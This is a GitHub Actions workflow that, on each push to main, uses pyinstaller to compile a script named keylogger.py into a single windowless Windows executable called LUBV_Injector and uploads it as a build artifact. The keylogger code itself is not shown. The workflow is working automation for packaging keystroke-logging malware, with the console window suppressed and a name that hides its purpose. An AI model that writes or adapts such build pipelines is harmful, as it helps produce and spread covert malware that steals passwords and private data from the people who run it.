name: Build EXE

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
    
    - name: Build EXE
      run: |
        pyinstaller --onefile --noconsole --name LUBV_Injector keylogger.py
    
    - name: Upload EXE
      uses: actions/upload-artifact@v3
      with:
        name: LUBV_Injector
        path: dist/LUBV_Injector.exe
